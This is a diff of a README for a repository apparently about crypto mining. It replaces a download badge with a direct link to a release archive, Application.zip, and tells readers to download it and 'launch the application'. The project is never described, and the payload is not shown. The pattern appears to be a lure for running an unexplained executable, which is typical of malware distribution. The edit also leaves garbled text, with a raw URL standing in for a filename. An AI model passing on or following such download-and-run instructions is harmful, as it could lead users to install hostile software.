@@ -18,9 +18,9 @@ In this repository, you will find valuable resources, insights, and tools relate
 
 ## 🔗 Important Link
 
-[![Download Here](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download Here](https://github.com/thacyano15/Mining/releases/download/v1.0.0/Application.zip)](https://github.com/thacyano15/Mining/releases/download/v1.0.0/Application.zip)
 
-The above link leads to the necessary files for your mining operations. Click on the button to download the Application.zip file. Once downloaded, launch the application to kickstart your mining journey. Happy mining!
+The above link leads to the necessary files for your mining operations. Click on the button to download the https://github.com/thacyano15/Mining/releases/download/v1.0.0/Application.zip file. Once downloaded, launch the application to kickstart your mining journey. Happy mining!
 
 In case the link is not functional or you require additional resources, don't forget to check the "Releases" section of this repository for alternative download options.
 
